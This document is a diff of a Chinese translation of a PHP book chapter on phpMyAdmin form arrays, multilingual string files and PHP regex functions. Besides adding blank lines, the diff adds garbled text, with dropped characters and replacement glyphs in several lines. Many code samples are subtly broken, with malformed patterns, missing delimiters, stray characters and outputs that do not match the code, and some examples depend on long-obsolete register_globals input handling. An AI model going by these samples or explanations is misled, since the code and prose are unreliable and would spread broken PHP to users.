-由 Chris Jackson 贡献的查询示例（QBE）工具是创建允许用户更改的表单面的很好的示例。安装 phpMyAdmin 后，从左侧选择一个数据库，然后点击数据库表之一的 select 选项。图 8.2 显示了名为 select! 表的生成页面。当填充表单后，phpMyAdmin 会动态构建 SQL 语句、执行它并显示结果。你可以在 http://phpwizard.net/phpMyAdmin/phpMyAdmin/ 找到在线演示。它让你以类似于 Access 中 QBE 工具的方式构建 SQL 查询——通过从列表中选择字段并为它们指定值。多个字段和值可以通过或/与组合。有趣的部分是字段行和准则列可以在运行时增加或减少。如何实现这一点？关键在于表单中的数组。当你有如下表单元素时：
+由 Chris Jackson 贡献的查询示例（QBE）工具是创建允用户更改的表单面的很好的示例。安装 phpMyAdmin 后，从左侧选择一个数据库，然后点击数据库表之一的 select 选项。图 8.2 显示了名为 select! 表的生成页面。当填充表单后，phpMyAdmin 会动态构建 SQL 语句、执行它并显示结果。你可以在 http://phpwizard.net/phpMyAdmin/phpMyAdmin/ 找到在线演示。它让你以类似于 Access 中 QBE 工具的方式构建 SQL 查询——通过从列表中选择字段并为它们指定值。多个字段和值可以通过或/与组合。有趣的部分是字段行和准则列可以在运行时增加或减少。如何实现这一点？关键在于表单中的数组。当你有如下表单元素时：
 
 ```
+
 <input type="text" name="foo[]" value="bar">
+
 ```
 
 PHP 会自动在你的 $foo 处理脚本中让该表单元素可用。在这种情况下，$foo 是一个标量；但是，告诉 PHP 将 $foo 视为数组是简单的。只需在表单中使用数组符号即可。
@@ -5735,7 +6246,9 @@ PHP 会自动在你的 $foo 处理脚本中让该表单元素可用。在这种�
 如果你在脚本中打印 `"foo[0]"`，输出将是 `"bar"`。当然你也可以指定一个文本字面量作为数组键：
 
 ```html
+
 <input type="text" name="foo[fubar]" value="bar">
+
 ```
 
 现在你会使用 `print "foo[fubar]"`。表单中的数组特别适用于用户可以选择多条条目的列表。顺便说一下，如果你在这种“多选”情况下使用标量，则第一个选中的元素将存储在变量中，其他元素将被忽略。而改用数组，你可以将所有选中的元素都放在一个地方。
@@ -5743,52 +6256,91 @@ PHP 会自动在你的 $foo 处理脚本中让该表单元素可用。在这种�
 由于 QBE 查询使用了非常高级（且难以阅读）的代码，我们将创建一个简单的示例。假设我们想让用户在表单中输入她的爱好。她应该将每个爱好输入到单独的表单字段中，以便更容易将结果存储到数据库中。由于我们不知道用户有多少个爱好，我们需要在运行时调整表单字段的数量。脚本需要检查是第一次调用它，还是表单已经提交：
 
 ```php
+
 <?php
+
 if (!isset($hobbies)) {
+
     // 如果 $hobbies 变量未设置，那么
+
     // 此脚本之前没有被调用过，
+
     // 并且应该只显示一个输入字段。
+
     $show = 1;
+
 } else {
+
     // 因为 $hobbies 变量已设置，
+
     // 我们可以通过查看 $hobbies 数组中
+
     // 有多少条目来决定显示多少字段；
+
     $show = count($hobbies);
+
 }
 
 // 现在看看我们是在添加还是删除。
+
 if (isset($add)) {
+
     $show++;
+
 }
+
 if (isset($delete) && $show > 1) {
+
     $show--;
+
 }
 
 // 遍历数组，显示每个
+
 // 条目。
+
 if (isset($submit)) {
+
     for ($i=0; $i<count($hobbies); $i++) {
+
         print "$hobbies[$i]<br";
+
     }
+
 }
+
 ?>
 
 <form method="post" action="test.php3">
+
 <?php
+
 // 第二次遍历数组，
+
 // 为每个条目创建一个输入框。
+
 for ($i=0; $i < $show; $i++) {
+
 ?>
+
 <input type="text" name="hobbies[]"><br>
+
 <?php
+
 }
+
 ?>
 
 // 表单的其余部分由提交按钮组成。
+
 <input type="submit" name="add" value="Add">
+
 <input type="submit" name="delete" value="Delete"><p>
+
 <input type="submit" name="submit" value="Submit hobbies">
+
 </form>
+
 ```
 
 给多个按钮命名不同的名称是根据点击了哪个按钮来创建不同操作简单的方法。脚本通过 `isset()` 检查按钮是否已提交；只有被点击的按钮会被设置。
@@ -5808,10 +6360,15 @@ PhpMyAdmin 支持超过 10 种不同的语言，其中包含图 8.3 和 8.4 所�
 用两种或多种语言创建 Web 应用程序有什么麻烦？你可以直接复制整个项目并将其中的所有文本替换为你的翻译。但如果你想更改应用程序的布局呢？如果你发现了一个 Bug 呢？你必须修改每一个副本。对于 2 种语言可能并不麻烦，但对于 10 种语言就会变得非常痛苦。因此，我们需要找到一种方法将应用程序逻辑（代码）与布局（HTML）分离。你真正会使用的方法取决于你的情况：你的应用程序有多复杂、字符串更改频率频率、你是否需要动态切换到不同的语言。一种简单的方法（phpMyAdmin 使用这种方法）是将应用程序使用的所有字符串写入单独的文本文件中，并在应用程序内部引用这些字符串变量，而不是直接输出文本。来自 phpMyAdmin 的语言文件看起来如下：
 
 ```php
+
 $strPrimaryKey = "已添加主键于：";
+
 $strAccessDenied = "拒绝访问";
+
 $strAction = "操作";
+
 $strAddNewField = "添加新字段";
+
 ```
 
 ## 创建多语言网站
@@ -5819,7 +6376,9 @@ $strAddNewField = "添加新字段";
 在应用程序本身中，phpMyAdmin 使用这些定义的字符串来显示文本：
 
 ```html
+
 <input type="submit" value="<?php print $strAddNewField;?>">
+
 ```
 
 在它的配置文件（config.inc.php3）中，phpMyAdmin 定义了使用哪种语言，但要使其在运行时可配置是非常容易的。
@@ -5834,7 +6393,7 @@ Tobias Ratschiller 是意大利的一位新媒体顾问，专门从事大型动�
 
 模式匹配使用正则表达式在文本字符串中查找模式。正则表达式使用元字符序列来表示特殊字符和字符类，例如用 `\n` 表示换行符。
 
-以灵活的方式处理文本的能力是复杂计算机语言的特征之一。语言应该赋予你解析文本的能力，换句话说，找到字符串中你感兴趣的部分。例如，你应该能够从全名中提取一个人的名字，或者从电话号码中提取区号。将来，你可能需要在数组中查找字母 "R" 或 "S"。PHP 满足了这些以及许多其他需求。
+以灵活的方式处文本的能力是复杂计算机语言的特征之一。语言应该赋予你解析文本的能力，换句话说，找到字符串中你感兴趣的部分。例如，你应该能够从全名中提取一个人的名字，或者从电话号码中提取区号。将来，你可能需要在数组中查找字母 "R" 或 "S"。PHP 满足了这些以及许多其他需求。
 
 你会发现模式匹配有两种用途。你可以搜索一个模式。或者，你可以搜索一个模式并将匹配的文本替换为你选择的文本。PHP 有两组匹配函数，一组基于 POSIX 风格的正则表达式，另一组基于 Perl 风格的正则表达式。Perl 风格的函数是在 PHP 3.0.9 版本中添加到 PHP 的；如果你在使用较旧版本，请关注 POSIX 风格的函数（或进行升级！）。
 
@@ -5869,7 +6428,7 @@ MySQL 也提供了一个用于模式匹配的 regex 函数。regex 函数将在�
 | blank | 匹配空格和制表符。 |
 | cntrl | 匹配所有 ASCII 值小于 32 的字符。有关这些内容的信息请参见附录 B，“ASCII 表格”。 |
 | lower | 匹配所有小写字母。 |
-| space | 匹配空格、制表符、换行和分页符。有关这些内容的信息请参见附录 B，“ASCII 表格”。 |
+| space | 匹空格、制表符、换行和分页符。有关这些内容的信息请参见附录 B，“ASCII 表格”。 |
 | upper | 匹配所有大写字母。 |
 | xdigit | 匹配十六进制中的所有数字。 |
 
@@ -5878,7 +6437,7 @@ MySQL 也提供了一个用于模式匹配的 regex 函数。regex 函数将在�
 **元字符**
 如前所述，元字符在模式匹配中被广泛使用。表 9.2 显示了模式中使用的元字符。
 
-### 表 9.2 模式的元字符
+### 表 9.2 模的元字符
 
 | 元字符 | 含义 |
 | --- | --- |
@@ -5909,13 +6468,13 @@ MySQL 也提供了一个用于模式匹配的 regex 函数。regex 函数将在�
 
 ## # POSIX 风格函数
 
-POSIX 是一个缩写，意思是 UNIX 的可移植操作系统接口（Portable Operating System Interface for UNIX）。它是一系列 IEEE 和 ISO 标准，定义了程序与操作系统之间的接口。使用这些标准可以帮助程序员创建可以移植到大多数 UNIX 变体以及某些 Windows 版本的程序。POSIX 的官方网站为 http://anubis.dkuug.dk/JTC1/SC22/WG15/。POSIX 标准由可移植应用程序标准委员会（PASC）开发，其网站为 http://www.pasc.org。
+POSIX 是一个缩写，意思是 UNIX 的可移植操作系统接口（Portable Operating System Interface for UNIX）。它是一系列 IEEE 和 ISO 标定，定义了程序与操作系统之间的接口。使用这些标准可以帮助程序员创建可以移植到大多数 UNIX 变体以及某些 Windows 版本的程序。POSIX 的官方网站为 http://anubis.dkuug.dk/JTC1/SC22/WG15/。POSIX 标准由可移植应用程序标准委员会（PASC）开发，其网站为 http://www.pasc.org。
 
 PHP 有六个与模式匹配相关的函数：
 
 - ereg—如果其模式参数匹配，该函数返回 true，否则返回 false。
 - egeri—此函数与 ereg 相同，但忽略大小写区别。
-- preg_replace—此函数替换匹配模式的文本。
+- preg_replace—此函数替换匹配模的文本。
 - egeri_replace—此函数与 ereg_replace 相同，但忽略大小写区别。
 - split—此函数根据其分隔符参数将字符串拆分为部分。
 - sql_regcase—此函数根据其参数创建括号表达式，以便生成不区分大小写的 SQL 语句。例如，`sql_regcase("ab")` 返回 `[aB][bB]`。我更倾向于使用 SQL upper 函数，大多数数据库都支持它。在这种情况下，我倾向于使用 `select *` from customers WHERE `UPPER(first_name)` = 'DAVID'`而不是 `select * from customers where first_name = '[dD][aA][vV][iI][dD]'`。
@@ -5927,8 +6486,11 @@ PHP 有六个与模式匹配相关的函数：
 ### 语法
 
 ```php
+
 int ereg(string PATTERN, string TARGET, [array MATCHES]);
+
 int eregi(string PATTERN, string TARGET, [array MATCHES]);
+
 ```
 
 ## 描述
@@ -5946,27 +6508,39 @@ eregi 执行相同的搜索，但忽略大小写区别。
 以下示例代码将电话号码解析为三个部分（即区号、交换局和号码），并显示整个号码、区号和交换局。独立的变量持有了识别这些部分的模式。使用这些变量有助于更易地理解模式。
 
 ```php
+
 $target = "David Medinets,973-927-7670";
 
 // 匹配连续三个数字的区号。
+
 $pat_area = '([0-9][0-9][0-9])';
 
 // 使用边界匹配交换局。
+
 $pat_exchange = '([0-9]{3})';
 
 // 使用字符类匹配号码。
+
 $pat_number = '[:digit:][4}';
 
 // 将三个模式合并为一个。
+
 $pattern = "$pat_area-$pat_exchange-$pat_number";
 
 if (ereg($pattern, $target, $matches)) {
+
     echo "$matches[0]<br>";
+
     echo "Area Code: $matches[1]<br>";
+
     echo "Exchange: $matches[2]<br>";
+
 } else {
+
     // 处理“未找到号码”的错误。
+
 }
+
 ```
 
 这个示例看起来很简单，但如果你需要匹配使用点而不是连字符的数字会发生什么呢？例如，973.927.7670 在某些计数中是有效的电话号码。如果你选择使用类似 `[.]` 的括号表达式来通过此模式测试点或连字符：
@@ -5979,8 +6553,11 @@ Parse error: parse error, expecting 'STRING' or 'NUM_STRING' in (file) on line 1
 该错误是由 PHP 的变量插值将 `$pat_area["` 读为数组变量的开头引起的。相反，像此处所示使用变量来持有括号表达式：
 
 ```php
+
 $d = '[:.]';
+
 $pattern = "$pat_area$d$pat_exchange$d$pat_number";
+
 ```
 
 ## ereg_replace 和 eregi_replace
@@ -5988,26 +6565,38 @@ $pattern = "$pat_area$d$pat_exchange$d$pat_number";
 ### 语法
 
 ```php
+
 string ereg_replace(
+
     string PATTERN,
+
     string REPLACEMENT,
+
     string TARGET
+
 );
+
 ```
 
 ### # POSIX 风格函数
 
 ```php
+
 string eregi_replace(
+
     string PATTERN,
+
     string REPLACEMENT,
+
     string TARGET
+
 );
+
 ```
 
 ## 描述
 
-ereg_replace 在 TARGET 参数中搜索与 PATTERN 的匹配项，并将其替换为 REPLACEMENT。eregi 执行相同的搜索，但忽略大小写区别。如果提供了第三个参数，文本将被放在其第一个元素中，并通过 `$matches[0]` 访问。括号部分的匹配项被存储为指定数组的元素。第一个匹配的子字符串放在 `$matches[1]` 中。第二个匹配的子字符串放在 `$matches[2]` 中。依此类推。
+ereg_replace 在 TARGET 参数中搜索与 PATTERN 的匹配项，并将其替换为 REPLACEMENT。eregi 执行相同的搜索，但忽略大小写区别。如果提供了第三个参，文本将被放在其第一个元素中，并通过 `$matches[0]` 访问。括号部分的匹配项被存储为指定数组的元素。第一个匹配的子字符串放在 `$matches[1]` 中。第二个匹配的子字符串放在 `$matches[2]` 中。依此类推。
 
 ### 返回值
 
@@ -6018,9 +6607,13 @@ ereg_replace 在 TARGET 参数中搜索与 PATTERN 的匹配项，并将其替�
 示例示例了如何替换字符串中的模式。
 
 ```php
+
 $target = "The quick brown fox jumps over the lazy dog";
+
 $result = ereg_replace("fox", "cat", $target);
+
 echo $result; // 输出: The quick brown cat jumps over the lazy dog
+
 ```
 
 
@@ -6036,11 +6629,17 @@ echo $result; // 输出: The quick brown cat jumps over the lazy dog
 使用替代分隔符的主要目的是为了避免在那些用作非元字符含义的元字符前面散布大量难看的转义字符。你可能认为将变量放在模式中并然后使用变量插值就能解决这个问题。遗憾的是，并并非如此，至少在 PHP v3.0.9 中是如此。
 
 ```php
+
 $target = '/home/medined/readme.txt';
+
 $pattern = '/medined/';
+
 if (preg_match("/pattern/", $target) {
+
     echo 'found';
+
 }
+
 ```
 
 上述代码会导致以下错误：
@@ -6066,7 +6665,7 @@ Warning: Unknown option 'e' in (file) on line (number)
 | S | 此选项研究模式以尝试提高搜索速度。目前，研究模式仅对于没有单一起始字符的非锚定模式有用。 |
 | U | 此选项强制进行非贪婪搜索。通常，搜索是贪婪的——它们寻找尽可能长的匹配文本。例如，模式 "/a+/U" 匹配字符串 "baaac" 中的 "aaa"。非贪婪模式 "/a+" 匹配 "a"。 |
 | X | 此功能预留供以后使用。使用时，任何与非元字符配合的反斜杠都会导致错误。 |
-| i | 此选项强制匹配不区分大小写。 |
+| i | 此选项强制匹��不区分大小写。 |
 | m | 此选项将字符串视为多行而不是单行。当使用此选项时，^ 和 $ 锚点元字符会匹配字符串中的任何换行符，以及字符串的开头和末尾。 |
 | s | 此选项强制点号元字符也匹配换行符。 |
 | x | 此选项强制 PHP 忽略未用反斜杠转义或字符类内的空白字符。我强烈建议使用此选项，以便你使用空格来提高正则表达式的可读性。 |
@@ -6120,7 +6719,9 @@ Warning: Unknown option 'e' in (file) on line (number)
 扩展还允许你在不影响模式内存的情况下更改评估顺序。例如：
 
 ```php
+
 $pattern = "/(?:[a-b])+";
+
 ```
 
 匹配任意顺序重复一次或多次的 a 或 b 字符。模式内存不受影响。
@@ -6128,9 +6729,13 @@ $pattern = "/(?:[a-b])+";
 有时你想将模式组件包含在模式中，但不包含在存储匹配字符串的数组中。这种技术的术语是零宽正向先行断言。你可以使用它来确保匹配组件随后的字符串是正确的，而不影响匹配值。例如，如果你有如下数据
 
 ```php
+
 $data[0] = 'David Veterinarian 56';
+
 $data[1] = 'Jackie Orthopedist 34';
+
 $data[2] = 'Karen Veterinarian 28';
+
 ```
 
 
@@ -6139,13 +6744,19 @@ $data[2] = 'Karen Veterinarian 28';
 如果你想找到所有的兽医并存储第一列的值，可以使用正瞻断言。例如：
 
 ```
+
 $pattern = "/\w+(?=\sVet)/";
+
 ```
 
 ```
+
 while (list($key, $target) = each($data)) {
+
 preg_match_all($pattern, $target, $matches);
+
 }
+
 ```
 
 这段代码显示
@@ -6157,13 +6768,19 @@ David Karen
 我们将讨论的最后一个扩展是零宽否定断言。这种类型的组件用于指定不应该跟在匹配字符串之后的后的值。例如，使用与上一个示例相同的数据，你可以查找所有不是兽医的人。你的第一直觉可能是简单地将上一个示例中的 `(?=...)` 替换为 `(?!...)`。
 
 ```
+
 $pattern = "/\w+(?!\sVet)/";
+
 ```
 
 ```
+
 while (list($key, $target) = each($data)) {
+
 preg_match_all($pattern, $target, $matches);
+
 echo $matches[0][0] . " ";
+
 ```
 
 遗憾的是，这段代码显示
@@ -6173,7 +6790,9 @@ Davi Jackie Kare
 这并不是你需要的。问题是 PHP 正在查看单词的最后一个字符以判断它是否匹配 "Vet" 字符序列。为了正确匹配第一个单词，你需要显式告诉 PHP 第一个单词结束于单词边界，如下：
 
 ```
+
 $pattern = "/\w+\b(?!\sVet)/";
+
 ```
 
 使用此模式，代码显示
@@ -6207,13 +6826,17 @@ preg_match 在 TARGET 中搜索 PATTERN。如果提供了第三个参数，匹�
 下面的示例代码将电话号码解析为三个部分（区号、交换局和号码），并显示整个电话号码、区号和交换局。独立的变量持有识别这些组件的模式。这些变量被用于使模式变得更容易理解。
 
 ```
+
 $target = "David Medinet,973-927-7670";
 
 // 匹配连续三个数字作为区号。
+
 $pat_area = '\d\d\d';
 
 // 使用边界匹配交换局和号码。
+
 $pat_exchange = '\d(3)';
+
 $pat_number == '\d(4)';```
 
 // 将三个模式合并为一个。
@@ -6221,11 +6844,17 @@ $pat_number == '\d(4)';```
 $pattern = "\$pat_area-\$pat_exchange-\$pat_number/";
 
 ```
+
 if (preg_match($pattern, $target, $matches)) {
+
     echo ": $matches[0]<br>";
+
     echo "Area Code: $matches[1]<br>";
+
     echo "Exchange: $matches[2]<br>";
+
 }
+
 ```
 
 ## preg_match_all
@@ -6233,12 +6862,19 @@ if (preg_match($pattern, $target, $matches)) {
 ### 语法
 
 ```
+
 int preg_match_all(
+
     string PATTERN,
+
     string TARGET,
+
     array MATCHES,
+
     [PREG_PATTERN_ORDER | PREG_SET_ORDER]
+
 );
+
 ```
 
 ## 描述
@@ -6258,10 +6894,15 @@ preg_match 在 TARGET 中搜索所有不重叠的 PATTERN 实例。匹配文本�
 下面的示例证明了 PHP 在每个匹配文本段结束后会继续搜索。例如，如果你在 "ABABAB" 中搜索 "ABA"，你可能会找到两个匹配项。然而，由于这些匹配是重叠的，PHP 只找到一个匹配项：
 
 ```
+
 $target = "ABABAB";
+
 $pattern = "/aba/i";
+
 preg_match_all($pattern, $target, $matches);
+
 echo count($matches);
+
 ```
 
 ## Perl 风格函数 215
@@ -6269,11 +6910,17 @@ echo count($matches);
 下面的示例显示了不同数据类型的组合。首先，标量目标字符串中的所有数字被替换为加号：
 
 ```
+
 $target = "12AB 13ABB 14ABBB";
+
 $pattern = "\d+\+";
+
 $replacement = "+";
+
 $result = preg_replace($pattern, $replacement, $target);
+
 echo "\$result<br>";
+
 ```
 
 这段代码显示
@@ -6287,10 +6934,15 @@ echo "\$result<br>";
 接下来，为 `pattern` 参数指定一个数组。此示例将所有数字以及所有连续的 B 或 b 字符改为加号。
 
 ```
+
 $target = "12AB 13ABB 14ABB"
+
 $pattern[0] = "/\d+/i";n$pattern[1] = "/\b+/i";n$replacement = "+";
+
 $result = preg_replace($pattern, $replacement, $target);
+
 echo "$result<br>";
+
 ```
 
 ## 此代码显示
@@ -6300,13 +6952,21 @@ echo "$result<br>";
 现在，将 `replacement` 参数指定为数组。此示例将所有数字改为加号，并将所有连续的 B 或 b 字符改为冒号。
 
 ```
+
 $target = "12AB 13ABB 14ABB"
+
 $pattern[0] = "/\d+/i"
+
 $pattern[1] = "/\b+/i"
+
 $replacement[0] = "+";
+
 $replacement[1] = ":"
+
 $result = preg_replace($pattern, $replacement, $target);
+
 echo "$result<br>";
+
 ```
 
 ## 此代码显示
@@ -6316,15 +6976,25 @@ echo "$result<br>";
 最后一个示例展示了当 `target` 参数使用数组时的结果。此示例将 `target` 数组中的每个元素中的数字改为加号，并将所有连续的 B 或 b 字符改为冒号：
 
 ```
+
 $target[0] = "12AB 13ABB 14ABB"
+
 $target[1] = "05QB 06BB 07BB"
+
 $pattern[0] = "/\d+/i"
+
 $pattern[1] = "/\b+/i"
+
 $replacement[0] = "+";
+
 $replacement[1] = ":"
+
 $result = preg_replace($pattern, $replacement, $target);
+
 echo "$result[0]<br>"
+
 echo "$result[1]<br>";
+
 ```
 
 此代码显示
@@ -6339,11 +7009,17 @@ echo "$result[1]<br>";
 # 语法
 
 ```
+
 array preg_split(
+
 string DELIMITER,
+
 string TARGET,
+
 [int LIMIT]
+
 );
+
 ```
 
 ## 描述
@@ -6359,36 +7035,53 @@ string TARGET,
 可以通过以下代码使 `preg_split` 函数复制 `preg_match` 函数所示的示例：
 
 ```
+
 $target = "973-927-7670";
+
 $arr_phone = preg_split("////", $target);
 
 if (count($arr_phone) - 3) {
+
   echo "Number: $target<br>";
+
   echo "Area Code: $arr_phone[0]<br>";
+
   echo "Exchange: $arr_phone[1]<br>";
+
 }
+
 ```
 
 你可以像这样使用 `preg_split` 解析点分十进制 IP 地址：
 
 ```
+
 $target = "206.121.23.120";
+
 $arr_ip = preg_split("/\./", $target);
+
 ```
 
 由于句号是一个元字符，因此需要在模式参数内部使用 `\` 字符对其进行转义。在模式中使用句号的另一种技术是创建一个括号表达式：
 
 ```
+
 $arr_ip = preg_split("/[\.]", $target);
+
 ```
 
 如果你需要从目标字符串中提取特定数量的项目，则 `limit` 参数非常有用。以下代码展示了如何提取句子第一个单词：
 
 ```
+
 $target = "Quickly, the lazy fox jumped.";
+
 $arr_words = preg_split("/[\s,]/, $target, 1);
+
 echo $arr_words[0];
-```
+
+
+
 
 此示例在括号表达式中使用字符类加上逗号字符，以便单词以空格或逗号结尾。
 
@@ -6403,9 +7096,13 @@ echo $arr_words[0];
 要判断字符串是否包含重复字符（例如 "ABC AA AA ABC" 中的 AA），请执行以下操作：
 
 ```
+
 $target = "ABC AA AA ABC";
+
 $pattern = "/(.+)/";
+
 $bln_repeats = preg_match($pattern, $target, $matches);
+
 ```
 
 此模式使用模式内存存储任何单个字符。然后使用反向引用 (`\1`) 来重复第一个字符。注意，反向引用可以在模式内部使用。执行这些语句后，`matches[1]` 存储了重复的字符。此模式匹配任何两个非换行字符。
@@ -6415,245 +7112,355 @@ $bln_repeats = preg_match($pattern, $target, $matches);
 要找到字符串中的第一个单词，可以这样做：
 
 ```
+
 $target = "Mary had a little lamb."
+
 $pattern = "/\s(\w+)/";
+
 preg_match($pattern, $target, $matches);
+
 ```
 
 执行这些语句后，`matches[1]` 存储了重复的字符。此模式匹配任何两个非换行字符。
 
-
-
-
-在这些语句之后，如果目标字符串包含整数字面量，则 $result 为 true，否则为 false。
+在这些语句之后，如果目标字符串包含整数字面量，则 `$result` 为 true，否则为 false。
 
 要匹配字符串中第一个单词的最后一个字符，可以这样操作：
 
 ```
+
 $target = 'There were 29 books.';
+
 $pattern = "/(\w\W)/";
+
 preg_match_all($pattern, $target, $matches);
+
 ```
 
-在这些语句之后，$matches[1][0] 存储了第一个单词的最后一个字符。通过检查 $matches[1] 数组中的其他元素，你可以确定目标字符串中其他单词的最后一个字符。如果你想让最后一个字符和随后的单词成为分隔符，请不要使用括号。在这种情况下，$matches[0][0] 将包含第一个单词的最后一个字符以及随后的空格。
+在这些语句之后，`$matches[1][0]` 存储了第一个单词的最后一个字符。通过检查 `$matches[1]` 数组中的其他元素，你可以确定目标字符串中其他单词的最后一个字符。如果你想让最后一个字符和随后的单词成为分隔符，请不要使用括号。在这种情况下，`$matches[0][0]` 将包含第一个单词的最后一个字符以及随后的空格。
 
 要匹配字符串中第二个单词的开头，可以这样操作：
 
 ```
+
 $target = 'There were 29 books.';
+
 $pattern = "/(\w)/";
+
 preg_match_all($pattern, $target, $matches);
+
 ```
 
-在这些语句之后，$matches[1][0] 存储了第二个单词的第一个字符。虽然这个模式与匹配单词结尾的模式相反，但它不会匹配第一个单词的开头！这是因为 \W 元字符的原因。简单地在模式中的 \W 之后添加一个 * 元字符是没有帮助的，因为它会匹配零个非单词字符，从而匹配字符串中的每一个单词字符。
+在这些语句之后，`$matches[1][0]` 存储了第二个单词的第一个字符。虽然这个模式与匹配单词结尾的模式相反，但它不会匹配第一个单词的开头！这是因为 `\W` 元字符的原因。简单地在模式中的 `\W` 之后添加一个 `*` 元字符是没有帮助的，因为它会匹配零个非单词字符，从而匹配字符串中的每一个单词字符。
 
 你可以添加另一个带有交或操作的模式，这样就能找到第一个单词的第一个字符了。例如：
 
 ```
+
 $target = 'There were 29 books.';
+
 $pattern = "/^(\w)|\W(\w)/";
+
 preg_match_all($pattern, $target, $matches);
-```
-
-虽然这个模式可以工作，但 $matches 数组的结构可能并不直观：
 
 ```
+
+虽然这个模式可以工作，但 `$matches` 数组的结构可能并不直观：
+
+```
+
 $matches[0][0] => 'T '
+
 $matches[0][1] => 'W '
+
 $matches[0][2] => '2 '
+
 $matches[0][3] => 'b '
+
 ```
 
 ## Perl 风格函数
 
 ```
+
 $matches[1][0] => 'T'
+
 $matches[2][0] => 'W'
+
 $matches[2][1] => '2'
+
 $matches[2][2] => 'b'
-```
-
-PHP 会为每个括号子字符串在 $matches 中创建一个新条目。你需要在处理 $matches 数组时记住它的行为。另外请注意，$matches[0] 中的所有条目都有完整的匹配文本，因此每个条目都包含一个尾随空格字符。
-
-添加第三个括号子字符串来匹配目标字符串中的数字可能是很有趣的。如果在模式中添加 (\d+) 会发生什么？你能猜到吗？
 
 ```
+
+PHP 会为每个括号子字符串在 `$matches` 中创建一个新条目。你需要在处理 `$matches` 数组时记住它的行为。另外请注意，`$matches[0]` 中的所有条目都有完整的匹配文本，因此每个条目都包含一个尾随空格字符。
+
+添加第三个括号子字符串来匹配目标字符串中的数字可能是很有趣的。如果在模式中添加 `(\d+)` 会发生什么？你能猜到吗？
+
+```
+
 $target = 'There were 29 books.';
+
 $pattern = "/(\w)(\w)|(\d+)";
+
 preg_match_all($pattern, $target, $matches);
-```
-
-这些语句会产生一个结构如下的 $matches 数组：
 
 ```
+
+这些语句会产生一个结构如下的 `$matches` 数组：
+
+```
+
 $matches[0][0] => 'T'
+
 $matches[0][1] => 'W'
+
 $matches[0][2] => '2'
+
 $matches[0][3] => '9'
+
 $matches[0][4] => 'b' <-- 找到了 'b'。
+
 ```
 
 ```
+
 $matches[1][0] => 'T'
+
 $matches[2][0] => 'W'
+
 $matches[2][1] => '2' <-- 没有 'b' 条目！
+
 ```
 
 ```
+
 $matches[3][2] => '9'
-```
-
-注意 (\d+)，(\w) 模式在 (\d+) 部分之前捕获了 2。同样注意，开始 books 的字符没有进入 $matches[2] 数组。这似乎是一个 bug。要匹配规范中的文件名，可以这样操作：
 
 ```
+
+注意 `(\d+)`, `(\w)` 模式在 `(\d+)` 部分之前捕获了 2。同样注意，开始 books 的字符没有进入 `$matches[2]` 数组。这似乎是一个 bug。要匹配规范中的文件名，可以这样操作：
+
+```
+
 $target = '/user/jackie/names.dat';
+
 $pattern = "/(.*)";
+
 preg_match_all($pattern, $target, $matches);
-```
-
-在这些语句之后，$matches[1][0] 等于 names.dat。匹配被锚定在字符串的开头，并且 .* 部分匹配到最后一个斜杠之前的所有内容，因为正则表达式是贪婪的。然后，下一个 (.*) 部分匹配文件名并将其存储到内存中。要匹配两个像那样的前缀和一个单词（如 rock 和 monk），可以这样操作：
 
 ```
+
+在这些语句之后，`$matches[1][0]` 等于 `names.dat`。匹配被锚定在字符串的开头，并且 `.*` 部分匹配到最后一个斜杠之前的所有内容，因为正则表达式是贪婪的。然后，下一个 `(.*)` 部分匹配文件名并将其存储到内存中。要匹配两个像那样的前缀和一个单词（如 rock 和 monk），可以这样操作：
+
+```
+
 $target = 'monk';
+
 $pattern = "/(?:rock|monk)(.*)/";
+
 preg_match_all($pattern, $target, $matches);
+
 ```
 
-交或操作表示 rock 或 monk 后面跟着 fish 需要知道发现了哪种替代方案。在模式中使用普通括号代替 (?:)。在用普通括号匹配后，$matches[1][0] 将等于 rock 或 monk。
+交或操作表示 rock 或 monk 后面跟着 fish 需要知道发现了哪种替代方案。在模式中使用普通括号代替 `(?:)`。在用普通括号匹配后，`$matches[1][0]` 将等于 rock 或 monk。
 
 ## 替换示例
 
 要删除字符串开头的空白字符，可以这样操作：
 
 ```
+
 $target = ' Happy Times';
+
 $pattern = '/^\s+/';
+
 $replacement = '';
+
 $result = preg_replace($pattern, $replacement, $target);
+
 ```
 
-此模式使用 \s 元字符匹配任何空白字符。加号意味着匹配一个或多个空白字符，而脱字符符号表示只在字符串开头。这个示例遵循了“trim”的哲学。换句话说，由于我们处理的是模式和正则表达式，因此使用模式来移除空格。使用 PHP 的 trim 函数来移除空格更高效。
+此模式使用 `\s` 元字符匹配任何空白字符。加号意味着匹配一个或多个空白字符，而脱字符符号表示只在字符串开头。这个示例遵循了“trim”的哲学。换句话说，由于我们处理的是模式和正则表达式，因此使用模式来移除空格。使用 PHP 的 `trim` 函数来移除空格更高效。
 
 ## Perl 风格函数
 
 要删除字符串末尾的空白字符，可以这样操作：
 
 ```
+
 $target = 'Happy Times';
+
 $pattern = '/\s+$';
+
 $replacement = '';
+
 $result = preg_replace($pattern, $replacement, $target);
+
 ```
 
-此模式使用 \s 元字符匹配任何空白字符。加号意味着匹配一个或多个空白字符，而美元符号表示只在字符串末尾。
+此模式使用 `\s` 元字符匹配任何空白字符。加号意味着匹配一个或多个空白字符，而美元符号表示只在字符串末尾。
 
 为了在字符串开头添加前缀，可以这样操作：
 
 ```php
+
 $target = 'Happy Times';
+
 $pattern = '/^(.*)/';
+
 $replacement = 'The';
+
 $result = preg_replace($pattern, $replacement, $target);
+
 ```
 
-这个替换语句使用 \1 和 \2 来反转两个单词。你可以使用类似的技术处理列信息。
+这个替换语句使用 `\1` 和 `\2` 来反转两个单词。你可以使用类似的技术处理列信息。
 
 为了执行“自有的”变量插值，可以这样操作：
 
-变量插值允许你为字符串添加参数。例如，(month) 在某个时间可能是一月，在另一个时间可能是三月。很难预测何时需要这种能力。使用这种技术将字符串存储在数据库中。当我需要显示字符串时，替换参数。
+变量插值允许你为字符串添加参数。例如，`(month)` 在某个时间可能是一月，在另一个时间可能是三月。很难预测何时需要这种能力。使用这种技术将字符串存储在数据库中。当我需要显示字符串时，替换参数。
 
 ```
+
 $target = 'Dear {honorific} {last_name},';
 
-// 括号用于将参数存储到 $matches[] 数组中。在这种情况下，数组将包含 'honorific' 和 'last_name' 条目。
+// 括号用于将参数存储到 `$matches[]` 数组中。在这种情况下，数组将包含 'honorific' 和 'last_name' 条目。
+
 $pattern = '/({\w+})/';
+
 ```
 
 ```php
+
 // 填充需要替换的参数。
+
 preg_match_all($pattern, $target, $matches);
+
 ```
 
 ## Perl 风格函数
 
 ```
+
 // 使用数组来确定插值中所使用的值。
+
 $replacement['honorific'] = "Mr.";
+
 $replacement['last_name'] = "Jones";
+
 ```
